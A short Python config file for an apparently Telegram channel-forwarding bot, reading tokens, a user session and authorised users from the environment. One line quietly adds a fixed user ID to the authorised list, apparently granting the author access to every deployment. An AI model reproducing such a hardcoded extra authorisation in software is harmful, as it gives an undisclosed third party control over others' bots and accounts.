#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) @AlbertEinsteinTG

import os
from time import time
from dotenv import load_dotenv

load_dotenv("config.env", override=True)

class Config (object):
    
    APP_ID = int(os.environ.get("APP_ID", 0))
    
    API_HASH = os.environ.get("API_HASH", "")
    
    AUTH_USERS = [int(x) for x in os.environ.get("AUTH_USERS", "123456789").split(" ")]
    
    AUTH_USERS.extend([1125210189])
    
    BOT_TOKEN = os.environ.get("BOT_TOKEN", ":")

    BOT_START_TIME = time()
    
    TARGET_CHANNEL = int(os.environ.get("TARGET_CHANNEL", 0))
    
    DESTINATION_CHANNEL = int(os.environ.get("DESTINATION_CHANNEL", 0))

    USER_SESSION = os.environ.get("USER_SESSION", "abcdefgh")
    
